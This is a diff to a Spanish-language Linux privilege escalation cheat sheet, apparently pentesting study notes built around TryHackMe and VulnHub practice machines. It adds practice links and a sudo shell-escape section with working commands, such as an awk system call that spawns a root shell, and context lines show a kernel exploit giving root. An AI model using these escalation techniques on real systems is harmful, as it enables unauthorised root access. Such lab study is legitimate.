@@ -57,12 +57,19 @@ Linux parrot 5.7.0-2parrot2-amd64 #1 SMP Debian 5.7.10-1parrot2 (2020-07-31) x86
 $ cat /proc/version
 Linux version 5.7.0-2parrot2-amd64 (team@parrotsec.org) (gcc version 9.3.0 (Debian 9.3.0-15), GNU ld (GNU Binutils for Debian) 2.34.90.20200706) #1 SMP Debian 5.7.10-1parrot2 (2020-07-31)
 ```
-#### Escalada de Privilegios:
+#### Recursos:
 • [LinuxPrivChecker](https://github.com/linted/linuxprivchecker)  
 • Searchsploit "linux kernel"  
 • [LinuxExploitSuggester2](https://github.com/jondonas/linux-exploit-suggester-2)  
 
-### Ejemplo:
+#### Maquinas para practicar:
+[- Linux PrivEsc (TryHackMe)](https://tryhackme.com/room/linuxprivesc)   
+[- 0day (TryHackMe)](https://tryhackme.com/room/0day)  
+- Cybersploit (VulnHub)
+- Loly (VulnHub)
+- BTRSys 2.1 (VulnHub)
+
+### Ejemplo:  
 ```bash
 user@debian:~$ cat /proc/version                                                                                                                  
 Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014
@@ -180,6 +187,44 @@ user@debian:~$ su firefart
 Password:                                                          
 firefart@debian:/home/user# id                                     
 uid=0(firefart) gid=0(root) groups=0(root)                         
+
+```
+----
+----
+## Sudo (Secuencias de escape shell)
+#### Recursos:  
+[- gtfobins](https://gtfobins.github.io/ "gtfobins.github.io")   
+
+### Ejemplo
+```bash
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+
+user@debian:~$ sudo awk 'BEGIN {system("/bin/sh")}'
+sh-4.1# id
+uid=0(root) gid=0(root) groups=0(root)
+
+user@debian:~$ sudo iftop
+interface: eth0
+IP address is: 10.10.117.147
+MAC address is: 02:fe:2b:4b:63:f1
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+
 
 
 ```
